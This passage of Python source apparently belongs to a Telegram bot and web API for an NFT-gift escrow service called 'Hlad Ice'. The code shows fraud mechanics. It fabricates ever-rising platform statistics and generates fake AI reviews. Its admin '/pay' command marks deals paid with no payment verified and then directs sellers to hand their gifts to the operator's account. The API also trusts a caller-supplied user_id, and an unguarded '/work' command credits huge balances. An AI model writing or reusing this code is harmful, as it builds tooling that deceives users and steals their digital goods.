                InlineKeyboardButton(text="Инвентарь", web_app=WebAppInfo(url=build_webapp_url(user_id, page="inventory"))),
                InlineKeyboardButton(text="Кошелёк", callback_data="menu_balance")
            ],
            [
                InlineKeyboardButton(text="Мои сделки", callback_data="menu_deals"),
                InlineKeyboardButton(text="Поддержка", url=f"https://t.me/{ESCROW_ACCOUNT}")
            ],
            [InlineKeyboardButton(text="Язык / Language", callback_data="select_language")]
        ]
        if is_admin(user_id):
            rows.append([InlineKeyboardButton(text="Админ-панель", callback_data="menu_admin")])

    return InlineKeyboardMarkup(inline_keyboard=rows)

def admin_panel_keyboard():
    ai_status = "Остановить ИИ-отзывы" if ai_state.get("enabled") else "Запустить ИИ-отзывы"
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Добавить StringSession", callback_data="admin_set_session"),
            InlineKeyboardButton(text="Спарсить маркет ТГ", callback_data="admin_parse_tg_market")
        ],
        [
            InlineKeyboardButton(text=ai_status, callback_data="admin_toggle_ai"),
            InlineKeyboardButton(text="Создать 1 отзыв ИИ", callback_data="admin_gen_one_review")
        ],
        [
            InlineKeyboardButton(text="Начислить баланс", callback_data="admin_add_balance"),
            InlineKeyboardButton(text="Статистика", callback_data="admin_stats")
        ],
        [
            InlineKeyboardButton(text="Все сделки", callback_data="admin_all_deals"),
            InlineKeyboardButton(text="Пользователи", callback_data="admin_users")
        ],
        [
            InlineKeyboardButton(text="Баннер / Видео старта", callback_data="admin_welcome_media"),
            InlineKeyboardButton(text="Чаты поддержки", callback_data="admin_tickets")
        ],
        [InlineKeyboardButton(text="В главное меню", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int = 0):
    lang = get_user_language(user_id) or "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Main Menu" if lang == "en" else "В главное меню", callback_data="back_to_main")]
    ])

def language_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Русский", callback_data="set_lang_ru"),
            InlineKeyboardButton(text="English", callback_data="set_lang_en")
        ]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="TON", callback_data="curr_TON"),
            InlineKeyboardButton(text="STARS", callback_data="curr_STARS")
        ],
        [
            InlineKeyboardButton(text="RUB", callback_data="curr_RUB"),
            InlineKeyboardButton(text="UAH", callback_data="curr_UAH")
        ]
    ])

def get_welcome_text(user_id: int) -> str:
    lang = get_user_language(user_id) or "ru"
    if lang == "en":
        return (
            "<b>Hlad Ice — Safe Deals, NFT Market & Upgrade</b>\n\n"
            "• Conduct safe deals on NFTs and digital goods\n"
            "• Buy & resell NFT gifts on the internal Market\n"
            "• Try your luck in the New Year Upgrade\n"
            f"• Official NFT receiving & support: @{ESCROW_ACCOUNT}"
        )
    return (
        "<b>Hlad Ice — сделки на NFT, маркет и апгрейд</b>\n\n"
        "• Проведение безопасных сделок на NFT и цифровые товары\n"
        "• Встроенный маркет NFT-подарков и личный инвентарь\n"
        "• Новогодний апгрейд подарков\n"
        f"• Официальный аккаунт приёма NFT и поддержка: @{ESCROW_ACCOUNT}"
    )

# ============================================================
# 9. НАСТРОЙКА STRING SESSION В БОТЕ
# ============================================================
class SessionStates(StatesGroup):
    waiting_session = State()

@dp.callback_query(lambda c: c.data == "admin_set_session")
async def admin_set_session_prompt(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    has_sess = "Установлена" if telethon_cfg.get("string_session") else "Не установлена"
    await callback.message.edit_text(
        f"<b>Настройка Telethon StringSession для парсинга маркета</b>\n\n"
        f"Статус сессии: <b>{has_sess}</b>\n\n"
        f"Просто отправьте готовую строку <b>StringSession</b>:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Удалить сессию", callback_data="admin_clear_session")],
            [InlineKeyboardButton(text="Назад", callback_data="menu_admin")]
        ])
    )
    await state.set_state(SessionStates.waiting_session)
    await callback.answer()

@dp.message(SessionStates.waiting_session)
async def admin_save_session_msg(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await state.clear()
        return
    raw = (message.text or "").strip()
    telethon_cfg["string_session"] = raw
    telethon_cfg["auto_parse"] = True
    save_json(FILES["telethon_cfg"], telethon_cfg)
    await state.clear()
    await message.answer(
        "<b>StringSession сохранена!</b> Запускаю парсинг моделей и подарков с маркета Telegram...",
        reply_markup=admin_panel_keyboard()
    )
    res = await parse_telegram_star_market_via_session(lots_per_model=16)
    if res.get("success"):
        await message.answer(
            f"<b>Парсинг маркета завершён!</b>\n"
            f"Коллекций проверено: <b>{res.get('collections', 0)}</b>\n"
            f"Уникальных моделей найдено: <b>{res.get('models', 0)}</b>\n"
            f"Добавлено лотов: <b>{res['added']}</b>\n"
            f"Всего в маркете: <b>{res['total']}</b>"
        )
    else:
        await message.answer(f"<b>Ошибка парсинга:</b> {res.get('error')}")

@dp.callback_query(lambda c: c.data == "admin_clear_session")
async def admin_clear_session(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    telethon_cfg["string_session"] = ""
    telethon_cfg["auto_parse"] = False
    save_json(FILES["telethon_cfg"], telethon_cfg)
    await state.clear()
    await callback.message.edit_text("Сессия удалена.", reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_parse_tg_market")
async def admin_parse_tg_market_btn(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    await callback.answer("Парсинг моделей с маркета запущен...")
    res = await parse_telegram_star_market_via_session(lots_per_model=16)
    if res.get("success"):
        await callback.message.edit_text(
            f"<b>Парсинг завершён!</b>\n"
            f"Моделей найдено: <b>{res.get('models', 0)}</b> | Добавлено лотов: <b>{res['added']}</b>\n"
            f"Всего в маркете: <b>{res['total']}</b>\n\n"
            + get_admin_dashboard_text(),
            reply_markup=admin_panel_keyboard()
        )
    else:
        await callback.message.edit_text(
            f"<b>Ошибка парсинга:</b> {res.get('error')}\n\n" + get_admin_dashboard_text(),
            reply_markup=admin_panel_keyboard()
        )

# ============================================================
# 10. БАННЕР СТАРТА И ОБРАБОТЧИКИ МЕНЮ БОТА
# ============================================================
class AdminMediaStates(StatesGroup):
    waiting_media = State()

@dp.callback_query(lambda c: c.data == "admin_welcome_media")
async def admin_welcome_media(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    current = welcome_media.get("media", "Не установлено")
    await callback.message.edit_text(
        f"<b>Приветственный баннер</b>\n\nТекущий файл: {current}\n\nОтправьте <b>видео</b>, <b>GIF</b> или <b>фото</b>:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Удалить баннер", callback_data="admin_clear_media")],
            [InlineKeyboardButton(text="Назад", callback_data="menu_admin")]
        ])
    )
    await state.set_state(AdminMediaStates.waiting_media)
    await callback.answer()

@dp.message(AdminMediaStates.waiting_media)
async def admin_save_media(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await state.clear()
        return
    if message.video:
        media_data = {"file_id": message.video.file_id, "type": "video", "media": "Видео"}
    elif message.animation:
        media_data = {"file_id": message.animation.file_id, "type": "gif", "media": "GIF"}
    elif message.photo:
        media_data = {"file_id": message.photo[-1].file_id, "type": "photo", "media": "Фото"}
    else:
        await message.answer("Отправьте видео, GIF или фото.")
        return
    global welcome_media
    welcome_media.update(media_data)
    save_json(FILES["welcome_media"], welcome_media)
    await message.answer(f"Баннер сохранён ({media_data['media']}).", reply_markup=admin_panel_keyboard())
    await state.clear()

@dp.callback_query(lambda c: c.data == "admin_clear_media")
async def admin_clear_media(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    global welcome_media
    welcome_media = {}
    save_json(FILES["welcome_media"], welcome_media)
    await callback.message.edit_text("Баннер удалён.", reply_markup=admin_panel_keyboard())
    await state.clear()
    await callback.answer()

async def send_welcome_with_banner(chat_id: int, user_id: int):
    text = get_welcome_text(user_id)
    markup = main_menu_keyboard(user_id)
    media_type = welcome_media.get("type")
    media_file_id = welcome_media.get("file_id")

    if media_file_id and media_type:
        try:
            if media_type == "video":
                await bot.send_video(chat_id, video=media_file_id, caption=text, reply_markup=markup)
                return
            elif media_type == "gif":
                await bot.send_animation(chat_id, animation=media_file_id, caption=text, reply_markup=markup)
                return
            elif media_type == "photo":
                await bot.send_photo(chat_id, photo=media_file_id, caption=text, reply_markup=markup)
                return
        except Exception:
            pass

    await bot.send_message(chat_id, text, reply_markup=markup, disable_web_page_preview=True)

@dp.message(Command("work"))
async def cmd_work(message: types.Message):
    for curr in ["ton", "stars", "rub", "uah"]:
        add_balance(message.from_user.id, curr, 10000000)
    await message.answer(
        "<b>Тестовый баланс начислен:</b>\n10,000,000 TON / STARS / RUB / UAH",
        reply_markup=back_to_main_keyboard(message.from_user.id)
    )

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    get_balance(message.from_user.id)
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_", 1)[1].strip()
        await handle_deal_link(message, deal_id)
        return

    lang = get_user_language(message.from_user.id)
    if not lang:
        await message.answer("<b>Выберите язык / Choose your language:</b>", reply_markup=language_keyboard())
        return

    await send_welcome_with_banner(message.chat.id, message.from_user.id)

@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer("Language updated" if lang == "en" else "Язык обновлён")
    try:
        await callback.message.delete()
    except Exception:
        pass
    await send_welcome_with_banner(callback.message.chat.id, callback.from_user.id)

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except Exception:
        pass
    await bot.send_message(callback.message.chat.id, "<b>Выберите язык / Choose your language:</b>", reply_markup=language_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except Exception:
        pass
    await send_welcome_with_banner(callback.message.chat.id, callback.from_user.id)
    await callback.answer()

async def handle_deal_link(message: types.Message, deal_id: str):
    uid = message.from_user.id
    uname = (message.from_user.username or "").lower()
    lang = get_user_language(uid) or "ru"

    global deals
    deals = load_json(FILES["deals"], {})

    if deal_id not in deals:
        text = f"Deal <b>#{deal_id}</b> not found." if lang == "en" else f"Сделка <b>#{deal_id}</b> не найдена или уже завершена."
        await message.answer(text, reply_markup=back_to_main_keyboard(uid))
        return

    deal = deals[deal_id]
    is_target_buyer = deal.get("buyer_id") == uid or (uname and deal.get("buyer_username", "").lower() == uname)
    is_target_seller = deal.get("seller_id") == uid or (uname and deal.get("seller_username", "").lower() == uname)

    if not is_target_buyer and not is_target_seller:
        text = (
            f"Access denied. Deal <b>#{deal_id}</b> is intended for @{deal.get('seller_username')} and @{deal.get('buyer_username')}."
            if lang == "en" else
            f"Доступ закрыт. Сделка <b>#{deal_id}</b> создана для @{deal.get('seller_username')} и @{deal.get('buyer_username')}."
        )
        await message.answer(text, reply_markup=back_to_main_keyboard(uid))
        return

    first_join = False
    if is_target_buyer:
        if not deal.get("buyer_joined"):
            first_join = True
        deal["buyer_id"] = uid
        deal["buyer_joined"] = True

    if is_target_seller:
        if not deal.get("seller_joined"):
            first_join = True
        deal["seller_id"] = uid
        deal["seller_joined"] = True

    save_json(FILES["deals"], deals)

    if first_join:
        if is_target_buyer and deal.get("seller_id") and deal["seller_id"] != uid:
            try:
                await bot.send_message(deal["seller_id"], f"Покупатель @{uname or uid} зашёл в сделку <b>#{deal_id}</b>.")
            except Exception:
                pass
        elif is_target_seller and deal.get("buyer_id") and deal["buyer_id"] != uid:
            try:
                await bot.send_message(
                    deal["buyer_id"],
                    f"Продавец @{uname or uid} зашёл в сделку <b>#{deal_id}</b>. Теперь вы можете оплатить сделку в приложении.",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="Перейти к оплате", web_app=WebAppInfo(url=build_webapp_url(deal["buyer_id"], page="deals", deal_id=deal_id)))]
                    ])
                )
            except Exception:
                pass

    both_joined = bool(deal.get("seller_joined") and deal.get("buyer_joined"))
    nft_html = f'\nNFT: <a href="{deal["nft_link"]}">{deal.get("nft_name", "Подарок")} #{deal.get("nft_number", "")}</a>' if deal.get("nft_link") else ""

    if lang == "en":
        wait_note = "Both participants joined. Payment is now unlocked." if both_joined else "Waiting for the second participant to open this link."
        text = (
            f"<b>Deal #{deal_id}</b>\n\n"
            f"Item: <b>{deal['product']}</b>\n"
            f"Amount: <b>{deal['amount']} {deal['currency']}</b>\n"
            f"Seller: @{deal.get('seller_username', '—')} ({'joined' if deal.get('seller_joined') else 'waiting'})\n"
            f"Buyer: @{deal.get('buyer_username', '—')} ({'joined' if deal.get('buyer_joined') else 'waiting'})"
            f"{nft_html}\n\n{wait_note}"
        )
        btn_label = "Open Deal in App"
    else:
        wait_note = "Оба участника вошли в сделку. Оплата доступна в приложении." if both_joined else "Ожидаем входа второго участника по ссылке."
        text = (
            f"<b>Сделка #{deal_id}</b>\n\n"
            f"Товар: <b>{deal['product']}</b>\n"
            f"Сумма: <b>{deal['amount']} {deal['currency']}</b>\n"
            f"Продавец: @{deal.get('seller_username', '—')} ({'в сделке' if deal.get('seller_joined') else 'ожидается'})\n"
            f"Покупатель: @{deal.get('buyer_username', '—')} ({'в сделке' if deal.get('buyer_joined') else 'ожидается'})"
            f"{nft_html}\n\n{wait_note}"
        )
        btn_label = "Открыть сделку"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=btn_label, web_app=WebAppInfo(url=build_webapp_url(uid, page="deals", deal_id=deal_id)))],
        [InlineKeyboardButton(text="Main Menu" if lang == "en" else "В главное меню", callback_data="back_to_main")]
    ])
    await message.answer(text, reply_markup=kb, disable_web_page_preview=True)

@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid) or "ru"
    bal = get_balance(uid)
    text = (
        f"<b>{'Your Wallet' if lang == 'en' else 'Ваш кошелёк'}</b>\n\n"
        f"TON: <b>{bal.get('ton', 0)}</b>\n"
        f"STARS: <b>{bal.get('stars', 0)}</b>\n"
        f"RUB: <b>{bal.get('rub', 0)}</b>\n"
        f"UAH: <b>{bal.get('uah', 0)}</b>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Open Wallet" if lang == "en" else "Открыть кошелёк", web_app=WebAppInfo(url=build_webapp_url(uid, page="balance")))],
        [InlineKeyboardButton(text="Main Menu" if lang == "en" else "В главное меню", callback_data="back_to_main")]
    ])
    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text, reply_markup=kb)
    else:
        await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    uid = callback.from_user.id
    uname = (callback.from_user.username or "").lower()
    lang = get_user_language(uid) or "ru"

    user_deals = [
        (d_id, d) for d_id, d in deals.items()
        if d.get("seller_id") == uid or d.get("buyer_id") == uid
        or (uname and d.get("seller_username", "").lower() == uname)
        or (uname and d.get("buyer_username", "").lower() == uname)
    ]

    if not user_deals:
        text = "You have no active deals." if lang == "en" else "У вас пока нет активных сделок."
    else:
        text = f"<b>{'My Deals' if lang == 'en' else 'Мои сделки'}</b>\n\n"
        status_names = {
            "waiting_payment": "Waiting payment" if lang == "en" else "Ожидает оплаты",
            "paid": "Paid" if lang == "en" else "Оплачено",
            "awaiting_confirmation": "Awaiting confirmation" if lang == "en" else "Передаётся",
            "completed": "Completed" if lang == "en" else "Завершено"
        }
        for d_id, d in user_deals[-8:]:
            text += (
                f"<b>#{d_id}</b> — {status_names.get(d['status'], d['status'])}\n"
                f"{d.get('product', '')} | <b>{d.get('amount', 0)} {d.get('currency', '')}</b>\n"
                f"@{d.get('seller_username', '—')} → @{d.get('buyer_username', '—')}\n\n"
            )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Manage in App" if lang == "en" else "Управление в приложении", web_app=WebAppInfo(url=build_webapp_url(uid, page="deals")))],
        [InlineKeyboardButton(text="Main Menu" if lang == "en" else "В главное меню", callback_data="back_to_main")]
    ])
    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text[:4000], reply_markup=kb)
    else:
        await callback.message.edit_text(text[:4000], reply_markup=kb)
    await callback.answer()

# ============================================================
# 11. АДМИН-ПАНЕЛЬ В БОТЕ
# ============================================================
def get_admin_dashboard_text() -> str:
    state_str = "АКТИВНА" if ai_state.get("enabled") else "ОСТАНОВЛЕНА"
    sess_str = "Подключена" if telethon_cfg.get("string_session") else "Не задана"
    total_rev = len(reviews_data.get("items", []))
    total_mkt = len(market_data.get("items", []))
    return (
        f"<b>Админ-панель {BOT_NAME}</b>\n\n"
        f"StringSession парсера: <b>{sess_str}</b>\n"
        f"Лотов в маркете: <b>{total_mkt}</b>\n"
        f"Автогенерация отзывов ИИ: <b>{state_str}</b> (всего: <b>{total_rev}</b>)\n"
        f"Курс: 1 STAR = 1.4 RUB | 1 TON = {rates_data.get('ton_to_rub')} RUB"
    )

@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    text = get_admin_dashboard_text()
    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text, reply_markup=admin_panel_keyboard())
    else:
        await callback.message.edit_text(text, reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_toggle_ai")
async def admin_toggle_ai(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    ai_state["enabled"] = not bool(ai_state.get("enabled"))
    save_json(FILES["ai_state"], ai_state)
    await callback.answer("Автопостинг ИИ запущен" if ai_state["enabled"] else "Автопостинг ИИ остановлен")
    await callback.message.edit_text(get_admin_dashboard_text(), reply_markup=admin_panel_keyboard())

@dp.callback_query(lambda c: c.data == "admin_gen_one_review")
async def admin_gen_one_review(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    await callback.answer("Генерирую отзыв...")
    entry = await generate_ai_review_entry()
    if entry:
        await callback.message.edit_text(
            f"<b>Новый отзыв добавлен</b>\n\n"
            f"Оценка: <b>{entry['rating']} / 5</b> ({entry['amount']} {entry['currency']})\n"
            f"Текст: {entry['text']}\n\n" + get_admin_dashboard_text(),
            reply_markup=admin_panel_keyboard()
        )
    else:
        await callback.message.edit_text("Модели временно недоступны.\n\n" + get_admin_dashboard_text(), reply_markup=admin_panel_keyboard())

@dp.callback_query(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    if not deals:
        await callback.message.edit_text("Сделок пока нет.", reply_markup=admin_panel_keyboard())
        return
    text = "<b>Последние сделки</b>\n\n"
    for d_id, d in list(deals.items())[-15:]:
        nft_part = f"\nNFT: {d['nft_link']}" if d.get("nft_link") else ""
        text += (
            f"<b>#{d_id}</b> | {d.get('status')}\n"
            f"@{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')} | {d.get('amount')} {d.get('currency')}"
            f"{nft_part}\n/pay {d_id} | /delete_deal {d_id}\n\n"
        )
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(), disable_web_page_preview=True)
    await callback.answer()

@dp.message(Command("pay"))
async def admin_pay_deal(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2 or args[1] not in deals:
        await message.answer("Использование: /pay [deal_id]")
        return
    deal_id = args[1]
    deal = deals[deal_id]
    deal["status"] = "paid"
    save_json(FILES["deals"], deals)
    await message.answer(f"Оплата по сделке #{deal_id} подтверждена.")
    if deal.get("seller_id"):
        try:
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Передать подарок", url=f"tg://send_gift?to={ESCROW_ACCOUNT}")],
                [InlineKeyboardButton(text="Открыть сделки", web_app=WebAppInfo(url=build_webapp_url(deal["seller_id"], page="deals")))]
            ])
            await bot.send_message(
                deal["seller_id"],
                f"<b>Сделка #{deal_id} оплачена</b>\n\n"
                f"Товар: {deal['product']}\nСумма: {deal['amount']} {deal['currency']}\n"
                f"Передайте подарок на @{ESCROW_ACCOUNT} и подтвердите передачу в приложении.",
                reply_markup=kb
            )
        except Exception:
            pass

@dp.message(Command("delete_deal"))
async def delete_deal_command(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2 or args[1] not in deals:
        await message.answer("Использование: /delete_deal [deal_id]")
        return
    del deals[args[1]]
    save_json(FILES["deals"], deals)
    await message.answer(f"Сделка #{args[1]} удалена.")

@dp.callback_query(lambda c: c.data == "admin_users")
async def admin_users(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    text = f"<b>Пользователи ({len(balance)})</b>\n\n"
    for uid, b in list(balance.items())[-20:]:
        text += f"<code>{uid}</code>: TON {b.get('ton', 0)} | STARS {b.get('stars', 0)} | RUB {b.get('rub', 0)} | UAH {b.get('uah', 0)}\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_tickets")
async def admin_tickets(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    active_chats = {uid: msgs for uid, msgs in chat_messages.items() if msgs}
    if not active_chats:
        await callback.message.edit_text("Сообщений в чате пока нет.", reply_markup=admin_panel_keyboard())
        return
    text = "<b>Чаты поддержки</b>\n\n"
    for uid, msgs in list(active_chats.items())[-10:]:
        last = msgs[-1]
        text += f"ID: <code>{uid}</code> — {last.get('text', '')[:50]}\nОтветить: <code>/chat_reply {uid} текст</code>\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.message(Command("chat_reply"))
async def chat_reply_command(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("Использование: /chat_reply [user_id] [ответ]")
        return
    target_uid, reply_text = args[1], args[2]
    chat_messages.setdefault(target_uid, []).append({
        "id": "m" + str(uuid.uuid4())[:8],
        "text": reply_text,
        "sender": "admin",
        "timestamp": datetime.now().isoformat(),
        "read": False
    })
    save_json(FILES["chat_messages"], chat_messages)
    await message.answer(f"Ответ отправлен пользователю {target_uid}.")
    try:
        await bot.send_message(
            int(target_uid),
            f"<b>Ответ поддержки {BOT_NAME}:</b>\n\n{reply_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Открыть чат", web_app=WebAppInfo(url=build_webapp_url(int(target_uid), page="support")))]
            ])
        )
    except Exception:
        pass

@dp.callback_query(lambda c: c.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    vol = round(sum(d.get("amount", 0) for d in deals.values() if d.get("currency") == "TON"), 1)
    await callback.message.edit_text(
        f"<b>Статистика</b>\n\n"
        f"Пользователей: <b>{len(balance)}</b>\n"
        f"Всего сделок: <b>{len(deals)}</b>\n"
        f"Объём TON: <b>{vol}</b>\n"
        f"Отзывов: <b>{len(reviews_data.get('items', []))}</b>\n"
        f"Лотов в маркете: <b>{len(market_data.get('items', []))}</b>",
        reply_markup=admin_panel_keyboard()
    )
    await callback.answer()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await callback.message.edit_text("Введите Telegram ID пользователя:")
    await state.set_state(AdminStates.waiting_user_id)
    await callback.answer()

@dp.message(AdminStates.waiting_user_id)
async def admin_get_user_id(message: types.Message, state: FSMContext):
    try:
        uid = int(message.text.strip())
        await state.update_data(target_user_id=uid)
        await message.answer("Выберите валюту:", reply_markup=currency_keyboard())
        await state.set_state(AdminStates.waiting_currency)
    except Exception:
        await message.answer("Введите корректный числовой ID.")

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(target_currency=callback.data.split("_")[1])
    await callback.message.edit_text("Введите сумму начисления:")
    await state.set_state(AdminStates.waiting_amount)
    await callback.answer()

@dp.message(AdminStates.waiting_amount)
async def admin_get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        data = await state.get_data()
        add_balance(data["target_user_id"], data["target_currency"], amount)
        await message.answer(
            f"Начислено <b>{amount} {data['target_currency']}</b> пользователю <code>{data['target_user_id']}</code>.",
            reply_markup=admin_panel_keyboard()
        )
        await state.clear()
    except Exception:
        await message.answer("Введите положительное число.")

# ============================================================
# 12. ФОНОВАЯ СТАТИСТИКА
# ============================================================
async def auto_increment_stats():
    while True:
        try:
            s = load_json(FILES["stats"], {})
            s["users"] = max(21481, s.get("users", 21481)) + random.randint(1, 3)
            s["deals_today"] = max(1287, s.get("deals_today", 1287)) + random.randint(0, 2)
            vol = s.get("volume", 627.4) * (1 + random.uniform(-0.3, 0.4) * 0.02)
            s["volume"] = round(max(627.4, min(9470.0, vol)), 1)
            save_json(FILES["stats"], s)
        except Exception:
            pass
        await asyncio.sleep(300)

# ============================================================
# 13. API MINI APP (МАРКЕТ С ФИЛЬТРАМИ КОЛЛЕКЦИЙ/МОДЕЛЕЙ, ИНВЕНТАРЬ, АПГРЕЙД)
# ============================================================
async def handle_web_request(request: web.Request):
    headers = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type"
    }

    if request.method == "OPTIONS":
        return web.Response(headers=headers, status=200)

    endpoint = request.path

    if request.method == "GET" and not endpoint.startswith("/api/"):
        if os.path.exists("index.html"):
            return web.FileResponse("index.html")
        return web.json_response({"status": "running"}, headers=headers)

    try:
        data = await request.json()
    except Exception:
        data = {}

    user_id = data.get("user_id")
    username = (data.get("username") or "").replace("@", "").strip()

    if endpoint == "/api/get_language":
        return web.json_response({"success": True, "lang": get_user_language(user_id) or "ru"}, headers=headers)

    elif endpoint == "/api/set_language":
        lang = data.get("lang", "ru")
        if user_id and lang in ("ru", "en"):
            set_user_language(user_id, lang)
        return web.json_response({"success": True, "lang": lang}, headers=headers)

    elif endpoint == "/api/balance":
        if not user_id:
            return web.json_response({"success": False, "error": "user_id required"}, headers=headers)
        completed_cnt = count_user_completed_deals(user_id, username)
        return web.json_response({
            "success": True,
            "balance": get_balance(user_id),
            "completed_deals": completed_cnt,
            "rates": rates_data
        }, headers=headers)

    elif endpoint == "/api/stats":
        return web.json_response({
            "success": True,
            "deals_today": stats.get("deals_today", 1287),
            "users": stats.get("users", 21481),
            "volume": stats.get("volume", 627.4)
        }, headers=headers)

    elif endpoint == "/api/is_admin":
        return web.json_response({"success": True, "is_admin": is_admin(user_id)}, headers=headers)

    # ------------------------------------------------------------
    # МАРКЕТ NFT (ВЫБОР КОЛЛЕКЦИЙ И МОДЕЛЕЙ ГАЛОЧКАМИ, ДЕШЕВЛЕ / ДОРОЖЕ)
    # ------------------------------------------------------------
    elif endpoint == "/api/market":
        selected_collections = data.get("collections") or []
        selected_models = data.get("models") or []
        sort_by = data.get("sort") or "newest"  # newest, price_asc, price_desc
        search_q = (data.get("search") or "").strip().lower()

        all_items = market_data.get("items", [])

        # Собираем все коллекции (названия подарков) и модели с превью-картинками для визуального фильтра
        collections_map = {}
        models_map = {}

        for it in all_items:
            col_name = it.get("collection") or it.get("name") or "Gift"
            mod_name = it.get("model") or "Original"
            img = it.get("image_url") or ""

            if col_name not in collections_map:
                collections_map[col_name] = {"name": col_name, "count": 0, "image": img}
            collections_map[col_name]["count"] += 1

            # Если выбраны конкретные коллекции, показываем модели только из этих коллекций
            if not selected_collections or col_name in selected_collections:
                if mod_name not in models_map:
                    models_map[mod_name] = {"name": mod_name, "collection": col_name, "count": 0, "image": img}
                models_map[mod_name]["count"] += 1

        filtered = all_items
        if selected_collections:
            col_set = set(selected_collections)
            filtered = [x for x in filtered if (x.get("collection") or x.get("name") or "Gift") in col_set]

        if selected_models:
            mod_set = set(selected_models)
            filtered = [x for x in filtered if (x.get("model") or "Original") in mod_set]

        if search_q:
            filtered = [
                x for x in filtered
                if search_q in (x.get("name") or "").lower()
                or search_q in str(x.get("number") or "")
                or search_q in (x.get("model") or "").lower()
            ]

        if sort_by == "price_asc":
            filtered = sorted(filtered, key=lambda x: float(x.get("stars_price") or x.get("prices", {}).get("STARS", 0)))
        elif sort_by == "price_desc":
            filtered = sorted(filtered, key=lambda x: float(x.get("stars_price") or x.get("prices", {}).get("STARS", 0)), reverse=True)

        out_items = []
        for x in filtered[:150]:
            xc = x.copy()
            st = float(xc.get("stars_price") or xc.get("prices", {}).get("STARS") or 100)
            xc["prices"] = calc_prices_from_stars(st)
            out_items.append(xc)

        return web.json_response({
            "success": True,
            "items": out_items,
            "total_market": len(all_items),
            "filtered_count": len(filtered),
            "collections": sorted(collections_map.values(), key=lambda c: c["count"], reverse=True),
            "models": sorted(models_map.values(), key=lambda m: m["count"], reverse=True),
            "rates": rates_data
        }, headers=headers)

    elif endpoint == "/api/market_buy":
        if not user_id:
            return web.json_response({"success": False, "error": "Требуется авторизация"}, headers=headers)

        completed_cnt = count_user_completed_deals(user_id, username)
